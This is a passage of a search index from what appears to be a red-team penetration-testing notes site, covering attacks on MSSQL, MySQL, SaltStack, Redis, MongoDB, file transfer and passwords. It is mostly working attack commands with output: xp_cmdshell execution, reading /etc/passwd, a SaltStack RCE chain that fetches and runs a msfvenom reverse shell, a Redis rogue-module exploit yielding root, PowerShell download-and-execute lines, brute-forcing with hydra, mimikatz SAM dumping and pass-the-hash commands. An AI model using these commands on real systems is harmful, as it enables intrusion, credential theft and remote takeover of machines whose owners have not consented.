return status = 0 ) ------","title":"Config xp_cmdshell"},{"location":"red-teaming/network-pentest/common-services/01443-mssql/#execute-commands_1","text":"1 > xp_cmdshell 'whoami' ; 2 > go output: nt service \\m ssql $sqlexpress output: NULL ( 2 rows affected, return status = 0 )","title":"Execute commands"},{"location":"red-teaming/network-pentest/common-services/03306-mysql/","text":"mysql 3306 Connection mysql -h <host> -u <user> -p<pass> Query show databases ; show tables ; use tables ; select * from users ; Readfile Reading and Writing Files SELECT LOAD_FILE ( '/etc/passwd' )","title":"3306 mysql"},{"location":"red-teaming/network-pentest/common-services/03306-mysql/#mysql-3306","text":"","title":"mysql 3306"},{"location":"red-teaming/network-pentest/common-services/03306-mysql/#connection","text":"mysql -h <host> -u <user> -p<pass>","title":"Connection"},{"location":"red-teaming/network-pentest/common-services/03306-mysql/#query","text":"show databases ; show tables ; use tables ; select * from users ;","title":"Query"},{"location":"red-teaming/network-pentest/common-services/03306-mysql/#readfile","text":"Reading and Writing Files SELECT LOAD_FILE ( '/etc/passwd' )","title":"Readfile"},{"location":"red-teaming/network-pentest/common-services/04505-4506-zmtp/","text":"zmtp 4505,4506 Saltstack 3000.1 - rce https://www.exploit-db.com/exploits/48421 msfvenom -p linux/x86/shell_reverse_tcp LHOST = ip LPORT = 4506 -f elf > shell.elf python3 exploit.py --master ip --exec \"curl ip:4505/shell.elf -o /tmp/shell\" python3 exploit.py --master ip --exec \"chmod +x /tmp/shell\" python3 exploit.py --master ip --exec \"/tmp/shell\" $ sudo nc -nvlp 4506 listening on [ any ] 4506 ... connect to [ ip ] from ( UNKNOWN ) [ ip ] 34288 id uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root )","title":"4505,4506 zmtp"},{"location":"red-teaming/network-pentest/common-services/04505-4506-zmtp/#zmtp-45054506","text":"","title":"zmtp 4505,4506"},{"location":"red-teaming/network-pentest/common-services/04505-4506-zmtp/#saltstack-30001-rce","text":"https://www.exploit-db.com/exploits/48421 msfvenom -p linux/x86/shell_reverse_tcp LHOST = ip LPORT = 4506 -f elf > shell.elf python3 exploit.py --master ip --exec \"curl ip:4505/shell.elf -o /tmp/shell\" python3 exploit.py --master ip --exec \"chmod +x /tmp/shell\" python3 exploit.py --master ip --exec \"/tmp/shell\" $ sudo nc -nvlp 4506 listening on [ any ] 4506 ... connect to [ ip ] from ( UNKNOWN ) [ ip ] 34288 id uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root )","title":"Saltstack 3000.1 - rce"},{"location":"red-teaming/network-pentest/common-services/05432-postgresql/","text":"postgresql 5432 Connection $ su postgres Password: $ psql psql ( 9 .4.15 ) Type \"help\" for help. Query postgres = # \\list postgres = # \\c database_name pentesterlab = # \\d pentesterlab = # select * from users; Readfile $ psql -U photoblog -W photoblog # CREATE TABLE demo(t text); # COPY demo from '[FILENAME]'; # SELECT * FROM demo;","title":"5432 postgresql"},{"location":"red-teaming/network-pentest/common-services/05432-postgresql/#postgresql-5432","text":"","title":"postgresql 5432"},{"location":"red-teaming/network-pentest/common-services/05432-postgresql/#connection","text":"$ su postgres Password: $ psql psql ( 9 .4.15 ) Type \"help\" for help.","title":"Connection"},{"location":"red-teaming/network-pentest/common-services/05432-postgresql/#query","text":"postgres = # \\list postgres = # \\c database_name pentesterlab = # \\d pentesterlab = # select * from users;","title":"Query"},{"location":"red-teaming/network-pentest/common-services/05432-postgresql/#readfile","text":"$ psql -U photoblog -W photoblog # CREATE TABLE demo(t text); # COPY demo from '[FILENAME]'; # SELECT * FROM demo;","title":"Readfile"},{"location":"red-teaming/network-pentest/common-services/06379-redis/","text":"Redis 6379 https://book.hacktricks.xyz/pentesting/6379-pentesting-redis Enumeration nmap --script redis-info -sV -p 6379 <IP> nc -vn 10 .10.10.10 6379 redis-cli -h 10 .10.10.10 # sudo apt-get install redis-tools Redis 4.x / 5.x - Unauthenticated Code Execution https://github.com/vulhub/redis-rogue-getshell cd RedisModulesSDK/exp/ sudo make cd RedisModulesSDK/ sudo make $ sudo python3 redis-master.py -r target -p 6379 -L myip -P 6379 -f RedisModulesSDK/exp.so -c \"id\" >> send data: b '*3\\r\\n$7\\r\\nSLAVEOF\\r\\n$14\\r\\nip\\r\\n$4\\r\\n6379\\r\\n' >> receive data: b '+OK\\r\\n' >> send data: b '*4\\r\\n$6\\r\\nCONFIG\\r\\n$3\\r\\nSET\\r\\n$10\\r\\ndbfilename\\r\\n$6\\r\\nexp.so\\r\\n' >> receive data: b '+OK\\r\\n' >> receive data: b '*1\\r\\n$4\\r\\nPING\\r\\n' >> receive data: b '*3\\r\\n$8\\r\\nREPLCONF\\r\\n$14\\r\\nlistening-port\\r\\n$4\\r\\n6379\\r\\n' >> receive data: b '*5\\r\\n$8\\r\\nREPLCONF\\r\\n$4\\r\\ncapa\\r\\n$3\\r\\neof\\r\\n$4\\r\\ncapa\\r\\n$6\\r\\npsync2\\r\\n' >> receive data: b '*3\\r\\n$5\\r\\nPSYNC\\r\\n$40\\r\\n53c8ubb260c5a95b8f9ecc4701a957edb7236d44\\r\\n$1\\r\\n1\\r\\n' >> send data: b '*3\\r\\n$6\\r\\nMODULE\\r\\n$4\\r\\nLOAD\\r\\n$8\\r\\n./exp.so\\r\\n' >> receive data: b '+OK\\r\\n' >> send data: b '*3\\r\\n$7\\r\\nSLAVEOF\\r\\n$2\\r\\nNO\\r\\n$3\\r\\nONE\\r\\n' >> receive data: b '+OK\\r\\n' >> send data: b '*4\\r\\n$6\\r\\nCONFIG\\r\\n$3\\r\\nSET\\r\\n$10\\r\\ndbfilename\\r\\n$8\\r\\ndump.rdb\\r\\n' >> receive data: b '+OK\\r\\n' >> send data: b '*2\\r\\n$11\\r\\nsystem.exec\\r\\n$2\\r\\nid\\r\\n' >> receive data: b '$40\\r\\neuid=0(root) gid=0(root) groups=0(root)\\n\\r\\n' euid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ) >> send data: b '*3\\r\\n$6\\r\\nMODULE\\r\\n$6\\r\\nUNLOAD\\r\\n$6\\r\\nsystem\\r\\n' >> receive data: b '+OK\\r\\n'","title":"6379 redis "},{"location":"red-teaming/network-pentest/common-services/06379-redis/#redis-6379","text":"https://book.hacktricks.xyz/pentesting/6379-pentesting-redis","title":"Redis 6379"},{"location":"red-teaming/network-pentest/common-services/06379-redis/#enumeration","text":"nmap --script redis-info -sV -p 6379 <IP> nc -vn 10 .10.10.10 6379 redis-cli -h 10 .10.10.10 # sudo apt-get install redis-tools","title":"Enumeration"},{"location":"red-teaming/network-pentest/common-services/06379-redis/#redis-4x-5x-unauthenticated-code-execution","text":"https://github.com/vulhub/redis-rogue-getshell cd RedisModulesSDK/exp/ sudo make cd RedisModulesSDK/ sudo make $ sudo python3 redis-master.py -r target -p 6379 -L myip -P 6379 -f RedisModulesSDK/exp.so -c \"id\" >> send data: b '*3\\r\\n$7\\r\\nSLAVEOF\\r\\n$14\\r\\nip\\r\\n$4\\r\\n6379\\r\\n' >> receive data: b '+OK\\r\\n' >> send data: b '*4\\r\\n$6\\r\\nCONFIG\\r\\n$3\\r\\nSET\\r\\n$10\\r\\ndbfilename\\r\\n$6\\r\\nexp.so\\r\\n' >> receive data: b '+OK\\r\\n' >> receive data: b '*1\\r\\n$4\\r\\nPING\\r\\n' >> receive data: b '*3\\r\\n$8\\r\\nREPLCONF\\r\\n$14\\r\\nlistening-port\\r\\n$4\\r\\n6379\\r\\n' >> receive data: b '*5\\r\\n$8\\r\\nREPLCONF\\r\\n$4\\r\\ncapa\\r\\n$3\\r\\neof\\r\\n$4\\r\\ncapa\\r\\n$6\\r\\npsync2\\r\\n' >> receive data: b '*3\\r\\n$5\\r\\nPSYNC\\r\\n$40\\r\\n53c8ubb260c5a95b8f9ecc4701a957edb7236d44\\r\\n$1\\r\\n1\\r\\n' >> send data: b '*3\\r\\n$6\\r\\nMODULE\\r\\n$4\\r\\nLOAD\\r\\n$8\\r\\n./exp.so\\r\\n' >> receive data: b '+OK\\r\\n' >> send data: b '*3\\r\\n$7\\r\\nSLAVEOF\\r\\n$2\\r\\nNO\\r\\n$3\\r\\nONE\\r\\n' >> receive data: b '+OK\\r\\n' >> send data: b '*4\\r\\n$6\\r\\nCONFIG\\r\\n$3\\r\\nSET\\r\\n$10\\r\\ndbfilename\\r\\n$8\\r\\ndump.rdb\\r\\n' >> receive data: b '+OK\\r\\n' >> send data: b '*2\\r\\n$11\\r\\nsystem.exec\\r\\n$2\\r\\nid\\r\\n' >> receive data: b '$40\\r\\neuid=0(root) gid=0(root) groups=0(root)\\n\\r\\n' euid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ) >> send data: b '*3\\r\\n$6\\r\\nMODULE\\r\\n$6\\r\\nUNLOAD\\r\\n$6\\r\\nsystem\\r\\n' >> receive data: b '+OK\\r\\n'","title":"Redis 4.x / 5.x - Unauthenticated Code Execution"},{"location":"red-teaming/network-pentest/common-services/27017-mongodb/","text":"MongoDB 27017 Scram Crack $ python3 scram-crack.py Tried 1000 passwords Tried 2000 passwords Tried 3000 passwords Tried 4000 passwords Password found: password123 Connect MongoDB mongo 'mongodb://admin:password123@mongodb0.examples.com' mongo --host mongodb0.examples.com --port 28015 -u \"alice\" -p \"password123\"\" Using MongoDB Step 1: See all your databases: show dbs Step 2: Select the database use your_database_name Step 3: Show the collections show collections This will list all the collections in your selected database. Step 4: See all the data db.collection_name.find () db.collection_name.find () .pretty () Find and update user Find user:1 in collection object db.objects.find ({ _key: /^user:1$/ }) Update password for user:1 db.objects.update ({ _key: /^user:1$/ } , { $set : { password: \" $2 y $12$LMqnkbq1FpTnOzAWTgizbugAOpGJaKl0h7PVHvDraW9e0wK2SR7Zu \" }}) WriteResult ({ \"nMatched\" : 1 , \"nUpserted\" : 0 , \"nModified\" : 1 })","title":"27017 mongodb"},{"location":"red-teaming/network-pentest/common-services/27017-mongodb/#mongodb-27017","text":"","title":"MongoDB 27017"},{"location":"red-teaming/network-pentest/common-services/27017-mongodb/#scram-crack","text":"$ python3 scram-crack.py Tried 1000 passwords Tried 2000 passwords Tried 3000 passwords Tried 4000 passwords Password found: password123","title":"Scram Crack"},{"location":"red-teaming/network-pentest/common-services/27017-mongodb/#connect-mongodb","text":"mongo 'mongodb://admin:password123@mongodb0.examples.com' mongo --host mongodb0.examples.com --port 28015 -u \"alice\" -p \"password123\"\"","title":"Connect MongoDB"},{"location":"red-teaming/network-pentest/common-services/27017-mongodb/#using-mongodb","text":"Step 1: See all your databases: show dbs Step 2: Select the database use your_database_name Step 3: Show the collections show collections This will list all the collections in your selected database. Step 4: See all the data db.collection_name.find () db.collection_name.find () .pretty ()","title":"Using MongoDB"},{"location":"red-teaming/network-pentest/common-services/27017-mongodb/#find-and-update-user","text":"Find user:1 in collection object db.objects.find ({ _key: /^user:1$/ }) Update password for user:1 db.objects.update ({ _key: /^user:1$/ } , { $set : { password: \" $2 y $12$LMqnkbq1FpTnOzAWTgizbugAOpGJaKl0h7PVHvDraW9e0wK2SR7Zu \" }}) WriteResult ({ \"nMatched\" : 1 , \"nUpserted\" : 0 , \"nModified\" : 1 })","title":"Find and update user"},{"location":"red-teaming/network-pentest/file-transfer/","text":"File Transfer wget, curl, axel, certutil Server python ruby php busybox apache2 python3 -m http.server 80 python -m SimpleHTTPServer 80 ruby -run -e httpd . -p 80 php -S 0 .0.0.0:80 busybox httpd -f -p 80 sudo systemctl start apache2 Client wget curl axel certutil wget -O /tmp/shell http://ip/shell.elf wget <uri> -P /path/to/ curl -o /tmp/shell http://ip/shell.elf axel -a -n 20 -o /tmp/shell http://ip/shell.elf certutil.exe -urlcache -f http://<url>/shell.exe C: \\\\ inetpub \\\\ wwwroot \\\\ shell.exe Socat Kali machine sudo socat TCP4-LISTEN:443,fork file:shell.exe Windows machine socat TCP4:ip:443 file:shell.exe,create Netcat Kali machine nc -nvlp 4444 < /usr/share/windows-resources/binaries/wget.exe Windows machine nc -nv ip 4444 > wget.exe SCP Command How to Use SCP Command to Securely Transfer Files scp [ OPTION ] [ user@ ] SRC_HOST: ] file1 [ user@ ] DEST_HOST: ] file2 To copy a file from a local to a remote system run the following command: scp -P 2322 file.txt remote_username@10.10.0.2:/remote/directory/newfilename.txt To copy a directory from a local to remote system, use the -r option: scp -r /local/directory remote_username@10.10.0.2:/remote/directory scp remote_username@10.10.0.2:/remote/file.txt /local/directory Upload files PHP Server Kali Machine <?php $uploaddir = '/var/www/uploads/' ; $uploadfile = $uploaddir . $_FILES [ 'file' ][ 'name' ]; move_uploaded_file ( $_FILES [ 'file' ][ 'tmp_name' ], $uploadfile ) ?> Client PowerShell ( New-Object System.Net.WebClient ) .UploadFile ( 'http://ip/upload.php' , 'test.txt' ) curl curl -F \"file=@nc.cmd\" http://ip/upload.php FTP Services FTP Server Install sudo apt-get install vsftpd sudo service vsftpd start Anonymous access /etc/vsftpd.conf anonymous_enable=YES Pure-FTPd Client setup-ftp.sh ftp.txt open ip 21 USER hades passwd bin GET nc.exe quit ftp -v -n -s:ftp.txt groupadd ftpgroup useradd -g ftpgroup -d /dev/null -s /etc ftpuser pure-pw useradd hades -u ftpuser -d /ftphome pure-pw mkdb cd /etc/pure-ftpd/auth/ ln -s ../conf/PureDB 60pdb mkdir -p /ftphome chown -R ftpuser:ftpgroup /ftphome/ systemctl restart pure-ftpd TFTP Server sudo apt update && sudo apt install atftp sudo mkdir /tftp sudo chown nobody: /tftp sudo atftpd --daemon --port 69 /tftp Checking running service $ getent services tftp tftp 69 /udp Client tftp -i ip put test.txt Windows PowerShell Kali machine sudo python3 -m http.server 80 Executing a remote PowerShell script powershell.exe IEX ( New-Object System.Net.WebClient ) .DownloadString ( 'http://ip/revshell.ps1' ) Windows machine ( new-object System.Net.WebClient ) .DownloadFile ( \"http://192.168.11.145/wget.exe\" , \"C:\\Users\\Public\\wget.exe\" ) ps1 script wget.ps1.txt powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1 echo $webclient = New-Object System.Net.WebClient >> wget.ps1 echo $url = \"http://ip/nc.exe\" >> wget.ps1 echo $file = \"nc.exe\" >> wget.ps1 echo $webclient .DownloadFile ( $url , $file ) >> wget.ps1 Powercat Bypass policy Download and execute from internet Local machine Set-ExecutionPolicy Unrestricted iex ( New-Object System . Net . Webclient ). DownloadString ( 'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1' ) . .\\ powercat . ps1 Kali machine sudo nc -lnvp 443 > powercat.ps1 Windows machine powercat -c ip -p 443 -i C: \\U sers \\P ublic \\p owercat.ps1 VBScript command wget.vbs.txt Paste and execute wget.vbs script to the Windows machine. cscript wget.vbs http://<url>/shell.exe shell.exe echo strUrl = WScript.Arguments.Item ( 0 ) > wget.vbs echo StrFile = WScript.Arguments.Item ( 1 ) >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs echo Err.Clear >> wget.vbs echo Set http = Nothing >> wget.vbs echo Set http = CreateObject ( \"WinHttp.WinHttpRequest.5.1\" ) >> wget.vbs echo If http Is Nothing Then Set http = CreateObject ( \"WinHttp.WinHttpRequest\" ) >> wget.vbs echo If http Is Nothing Then Set http = CreateObject ( \"MSXML2.ServerXMLHTTP\" ) >> wget.vbs echo If http Is Nothing Then Set http = CreateObject ( \"Microsoft.XMLHTTP\" ) >> wget.vbs echo http.Open \"GET\" , strURL, False >> wget.vbs echo http.Send >> wget.vbs echo varByteArray = http.ResponseBody >> wget.vbs echo Set http = Nothing >> wget.vbs echo Set fs = CreateObject ( \"Scripting.FileSystemObject\" ) >> wget.vbs echo Set ts = fs.CreateTextFile ( StrFile, True ) >> wget.vbs echo strData = \"\" >> wget.vbs echo strBuffer = \"\" >> wget.vbs echo For lngCounter = 0 to UBound ( varByteArray ) >> wget.vbs echo ts.Write Chr ( 255 And Ascb ( Midb ( varByteArray,lngCounter + 1 , 1 ))) >> wget.vbs echo Next >> wget.vbs echo ts.Close >> wget.vbs Hex String Smaller file upx -9 nc.exe exe2hex -x nc.exe -p nc.cmd SMB Protocol Install git clone https://github.com/SecureAuthCorp/impacket.git cd impacket sudo pip install -r requirements.txt sudo python3 setup.py install SMB Server $ locate whoami.exe /usr/share/windows-resources/binaries/whoami.exe smbserver.py a /usr/share/windows-binaries/ sudo impacket-smbserver a . SMB Client \\\\ <ip_server> \\a\\w hoami.exe","title":"File Transfer"},{"location":"red-teaming/network-pentest/file-transfer/#file-transfer","text":"","title":"File Transfer"},{"location":"red-teaming/network-pentest/file-transfer/#wget-curl-axel-certutil","text":"Server python ruby php busybox apache2 python3 -m http.server 80 python -m SimpleHTTPServer 80 ruby -run -e httpd . -p 80 php -S 0 .0.0.0:80 busybox httpd -f -p 80 sudo systemctl start apache2 Client wget curl axel certutil wget -O /tmp/shell http://ip/shell.elf wget <uri> -P /path/to/ curl -o /tmp/shell http://ip/shell.elf axel -a -n 20 -o /tmp/shell http://ip/shell.elf certutil.exe -urlcache -f http://<url>/shell.exe C: \\\\ inetpub \\\\ wwwroot \\\\ shell.exe","title":"wget, curl, axel, certutil"},{"location":"red-teaming/network-pentest/file-transfer/#socat","text":"Kali machine sudo socat TCP4-LISTEN:443,fork file:shell.exe Windows machine socat TCP4:ip:443 file:shell.exe,create","title":"Socat"},{"location":"red-teaming/network-pentest/file-transfer/#netcat","text":"Kali machine nc -nvlp 4444 < /usr/share/windows-resources/binaries/wget.exe Windows machine nc -nv ip 4444 > wget.exe","title":"Netcat"},{"location":"red-teaming/network-pentest/file-transfer/#scp-command","text":"How to Use SCP Command to Securely Transfer Files scp [ OPTION ] [ user@ ] SRC_HOST: ] file1 [ user@ ] DEST_HOST: ] file2 To copy a file from a local to a remote system run the following command: scp -P 2322 file.txt remote_username@10.10.0.2:/remote/directory/newfilename.txt To copy a directory from a local to remote system, use the -r option: scp -r /local/directory remote_username@10.10.0.2:/remote/directory scp remote_username@10.10.0.2:/remote/file.txt /local/directory","title":"SCP Command"},{"location":"red-teaming/network-pentest/file-transfer/#upload-files-php-server","text":"Kali Machine <?php $uploaddir = '/var/www/uploads/' ; $uploadfile = $uploaddir . $_FILES [ 'file' ][ 'name' ]; move_uploaded_file ( $_FILES [ 'file' ][ 'tmp_name' ], $uploadfile ) ?> Client PowerShell ( New-Object System.Net.WebClient ) .UploadFile ( 'http://ip/upload.php' , 'test.txt' ) curl curl -F \"file=@nc.cmd\" http://ip/upload.php","title":"Upload files PHP Server"},{"location":"red-teaming/network-pentest/file-transfer/#ftp-services","text":"","title":"FTP Services"},{"location":"red-teaming/network-pentest/file-transfer/#ftp-server","text":"Install sudo apt-get install vsftpd sudo service vsftpd start Anonymous access /etc/vsftpd.conf anonymous_enable=YES","title":"FTP Server"},{"location":"red-teaming/network-pentest/file-transfer/#pure-ftpd","text":"Client setup-ftp.sh ftp.txt open ip 21 USER hades passwd bin GET nc.exe quit ftp -v -n -s:ftp.txt groupadd ftpgroup useradd -g ftpgroup -d /dev/null -s /etc ftpuser pure-pw useradd hades -u ftpuser -d /ftphome pure-pw mkdb cd /etc/pure-ftpd/auth/ ln -s ../conf/PureDB 60pdb mkdir -p /ftphome chown -R ftpuser:ftpgroup /ftphome/ systemctl restart pure-ftpd","title":"Pure-FTPd"},{"location":"red-teaming/network-pentest/file-transfer/#tftp","text":"Server sudo apt update && sudo apt install atftp sudo mkdir /tftp sudo chown nobody: /tftp sudo atftpd --daemon --port 69 /tftp Checking running service $ getent services tftp tftp 69 /udp Client tftp -i ip put test.txt","title":"TFTP"},{"location":"red-teaming/network-pentest/file-transfer/#windows","text":"","title":"Windows"},{"location":"red-teaming/network-pentest/file-transfer/#powershell","text":"Kali machine sudo python3 -m http.server 80 Executing a remote PowerShell script powershell.exe IEX ( New-Object System.Net.WebClient ) .DownloadString ( 'http://ip/revshell.ps1' ) Windows machine ( new-object System.Net.WebClient ) .DownloadFile ( \"http://192.168.11.145/wget.exe\" , \"C:\\Users\\Public\\wget.exe\" ) ps1 script wget.ps1.txt powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1 echo $webclient = New-Object System.Net.WebClient >> wget.ps1 echo $url = \"http://ip/nc.exe\" >> wget.ps1 echo $file = \"nc.exe\" >> wget.ps1 echo $webclient .DownloadFile ( $url , $file ) >> wget.ps1","title":"PowerShell"},{"location":"red-teaming/network-pentest/file-transfer/#powercat","text":"Bypass policy Download and execute from internet Local machine Set-ExecutionPolicy Unrestricted iex ( New-Object System . Net . Webclient ). DownloadString ( 'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1' ) . .\\ powercat . ps1 Kali machine sudo nc -lnvp 443 > powercat.ps1 Windows machine powercat -c ip -p 443 -i C: \\U sers \\P ublic \\p owercat.ps1","title":"Powercat"},{"location":"red-teaming/network-pentest/file-transfer/#vbscript","text":"command wget.vbs.txt Paste and execute wget.vbs script to the Windows machine. cscript wget.vbs http://<url>/shell.exe shell.exe echo strUrl = WScript.Arguments.Item ( 0 ) > wget.vbs echo StrFile = WScript.Arguments.Item ( 1 ) >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs echo Err.Clear >> wget.vbs echo Set http = Nothing >> wget.vbs echo Set http = CreateObject ( \"WinHttp.WinHttpRequest.5.1\" ) >> wget.vbs echo If http Is Nothing Then Set http = CreateObject ( \"WinHttp.WinHttpRequest\" ) >> wget.vbs echo If http Is Nothing Then Set http = CreateObject ( \"MSXML2.ServerXMLHTTP\" ) >> wget.vbs echo If http Is Nothing Then Set http = CreateObject ( \"Microsoft.XMLHTTP\" ) >> wget.vbs echo http.Open \"GET\" , strURL, False >> wget.vbs echo http.Send >> wget.vbs echo varByteArray = http.ResponseBody >> wget.vbs echo Set http = Nothing >> wget.vbs echo Set fs = CreateObject ( \"Scripting.FileSystemObject\" ) >> wget.vbs echo Set ts = fs.CreateTextFile ( StrFile, True ) >> wget.vbs echo strData = \"\" >> wget.vbs echo strBuffer = \"\" >> wget.vbs echo For lngCounter = 0 to UBound ( varByteArray ) >> wget.vbs echo ts.Write Chr ( 255 And Ascb ( Midb ( varByteArray,lngCounter + 1 , 1 ))) >> wget.vbs echo Next >> wget.vbs echo ts.Close >> wget.vbs","title":"VBScript"},{"location":"red-teaming/network-pentest/file-transfer/#hex-string","text":"Smaller file upx -9 nc.exe exe2hex -x nc.exe -p nc.cmd","title":"Hex String"},{"location":"red-teaming/network-pentest/file-transfer/#smb-protocol","text":"Install git clone https://github.com/SecureAuthCorp/impacket.git cd impacket sudo pip install -r requirements.txt sudo python3 setup.py install SMB Server $ locate whoami.exe /usr/share/windows-resources/binaries/whoami.exe smbserver.py a /usr/share/windows-binaries/ sudo impacket-smbserver a . SMB Client \\\\ <ip_server> \\a\\w hoami.exe","title":"SMB Protocol"},{"location":"red-teaming/network-pentest/password-attack/","text":"Password Attacks Generate Wordlists /usr/share/wordlists /usr/share/seclists crunch Generation crunch options crunch 5 5 -t ,@@^% -o password.txt crunch 10 10 0123456789 -t 2343 @@@@@@ -o passwd.txt Using /usr/share/crunch/charset.lst crunch 4 4 -f /usr/share/crunch/charset.lst lalpha -o crunch.txt Placeholder Character Translation @ Lower case alpha characters , Upper case alpha characters % Numeric characters ^ Special characters including space cewl cewl $url -m 6 -w wordlists.txt john.conf Rules /etc/john/john.conf > [List.Rules:Wordlist] john --wordlist = passwd.txt --rules --stdout > pass-rules.txt Common Services HTTP htaccess Attack How To Set Up Password Authentication with Apache on Ubuntu 14.04 medusa -h 127 .0.0.1 -u kali -P ./pass.txt -M http -m DIR:/ RDP Attack crowbar -b rdp -s 192 .168.11.135/32 -u windows_10_1903_x64 -C ./pass.txt -n 4 SSH Attack hydra -l kali -P ./pass.txt ssh://127.0.0.1 HTTP POST Attack hydra -l admin -P ./pass.txt 192 .168.11.135 http-form-post \"/admin.php:user=admin&pass=^PASS^:INVALID CREDENTIALS\" -vV -f Leveraging Password Hashes Retrieving Password Hashes How to identify hash types Generate password for new user openssl passwd -1 -salt hades leecybersec > hash.txt hashid -m hash.txt john --wordlist = ./pass.txt hash.txt Passing the Hash in Windows Intro to Windows hashes Mimikatz.exe privilege::debug token::elevate lsadump::sam Pass-The-Hash Using smbmap List directory at folder Desktop smbmap -H 192 .168.11.135 -u windows_10_1903_x64 -p 'aad3b435b51404eeaad3b435b51404ee:68bdacb06923faed9dc32661308f594e' -r 'Users\\windows_10_1903_x64\\Desktop' Download file 41542.c in Windows 10 smbmap -H 192 .168.11.135 -u windows_10_1903_x64 -p 'aad3b435b51404eeaad3b435b51404ee:68bdacb06923faed9dc32661308f594e' --download 'Users\\windows_10_1903_x64\\Desktop\\41542.c' pth-winexe pth-winexe -U windows_10_1903_x64%aad3b435b51404eeaad3b435b51404ee:68bdacb06923faed9dc32661308f594e //192.168.11.135 cmd pth-wmis pth-wmis -U windows_10_1903_x64%aad3b435b51404eeaad3b435b51404ee:68bdacb06923faed9dc32661308f594e //192.168.11.135 cmd xfreerdp xfreerdp /v:192.168.11.135 /u:windows_10_1903_x64 /pth:68bdacb06923faed9dc32661308f594e wmiexec.py wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:68bdacb06923faed9dc32661308f594e windows_10_1903_x64@192.168.11.135 Password Cracking john --wordlist = ./pass.txt hash.txt unshadow passwd shadow > hash john --rules --wordlist = ./pass.txt hash https://hashcat.net","title":"Password Attack"},{"location":"red-teaming/network-pentest/password-attack/#password-attacks","text":"","title":"Password Attacks"},{"location":"red-teaming/network-pentest/password-attack/#generate-wordlists","text":"/usr/share/wordlists /usr/share/seclists","title":"Generate Wordlists"},{"location":"red-teaming/network-pentest/password-attack/#crunch","text":"Generation crunch options crunch 5 5 -t ,@@^% -o password.txt crunch 10 10 0123456789 -t 2343 @@@@@@ -o passwd.txt Using /usr/share/crunch/charset.lst crunch 4 4 -f /usr/share/crunch/charset.lst lalpha -o crunch.txt Placeholder Character Translation @ Lower case alpha characters , Upper case alpha characters % Numeric characters ^ Special characters including space","title":"crunch"},{"location":"red-teaming/network-pentest/password-attack/#cewl","text":"cewl $url -m 6 -w wordlists.txt","title":"cewl"},{"location":"red-teaming/network-pentest/password-attack/#johnconf-rules","text":"/etc/john/john.conf > [List.Rules:Wordlist] john --wordlist = passwd.txt --rules --stdout > pass-rules.txt","title":"john.conf Rules"},{"location":"red-teaming/network-pentest/password-attack/#common-services","text":"","title":"Common Services"},{"location":"red-teaming/network-pentest/password-attack/#http-htaccess-attack","text":"How To Set Up Password Authentication with Apache on Ubuntu 14.04 medusa -h 127 .0.0.1 -u kali -P ./pass.txt -M http -m DIR:/","title":"HTTP htaccess Attack"},{"location":"red-teaming/network-pentest/password-attack/#rdp-attack","text":"crowbar -b rdp -s 192 .168.11.135/32 -u windows_10_1903_x64 -C ./pass.txt -n 4","title":"RDP Attack"},{"location":"red-teaming/network-pentest/password-attack/#ssh-attack","text":"hydra -l kali -P ./pass.txt ssh://127.0.0.1","title":"SSH Attack"},{"location":"red-teaming/network-pentest/password-attack/#http-post-attack","text":"hydra -l admin -P ./pass.txt 192 .168.11.135 http-form-post \"/admin.php:user=admin&pass=^PASS^:INVALID CREDENTIALS\" -vV -f","title":"HTTP POST Attack"},{"location":"red-teaming/network-pentest/password-attack/#leveraging-password-hashes","text":"","title":"Leveraging Password Hashes"},{"location":"red-teaming/network-pentest/password-attack/#retrieving-password-hashes","text":"How to identify hash types Generate password for new user openssl passwd -1 -salt hades leecybersec > hash.txt hashid -m hash.txt john --wordlist = ./pass.txt hash.txt","title":"Retrieving Password Hashes"},{"location":"red-teaming/network-pentest/password-attack/#passing-the-hash-in-windows","text":"Intro to Windows hashes Mimikatz.exe privilege::debug token::elevate lsadump::sam Pass-The-Hash Using smbmap List directory at folder Desktop smbmap -H 192 .168.11.135 -u windows_10_1903_x64 -p 'aad3b435b51404eeaad3b435b51404ee:68bdacb06923faed9dc32661308f594e' -r 'Users\\windows_10_1903_x64\\Desktop' Download file 41542.c in Windows 10 smbmap -H 192 .168.11.135 -u windows_10_1903_x64 -p 'aad3b435b51404eeaad3b435b51404ee:68bdacb06923faed9dc32661308f594e' --download 'Users\\windows_10_1903_x64\\Desktop\\41542.c' pth-winexe pth-winexe -U windows_10_1903_x64%aad3b435b51404eeaad3b435b51404ee:68bdacb06923faed9dc32661308f594e //192.168.11.135 cmd pth-wmis pth-wmis -U windows_10_1903_x64%aad3b435b51404eeaad3b435b51404ee:68bdacb06923faed9dc32661308f594e //192.168.11.135 cmd xfreerdp xfreerdp /v:192.168.11.135 /u:windows_10_1903_x64 /pth:68bdacb06923faed9dc32661308f594e wmiexec.py wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:68bdacb06923faed9dc32661308f594e windows_10_1903_x64@192.168.11.135","title":"Passing the Hash in Windows"},{"location":"red-teaming/network-pentest/password-attack/#password-cracking","text":"john --wordlist = ./pass.txt hash.txt unshadow passwd shadow > hash john --rules --wordlist = ./pass.txt hash https://hashcat.net","title":"Password Cracking"},{"location":"red-teaming/network-pentest/port-redirection-tunneling/","text":"Port Redirection & Tunneling Port Redirection RINETD nano /etc/rinetd.conf 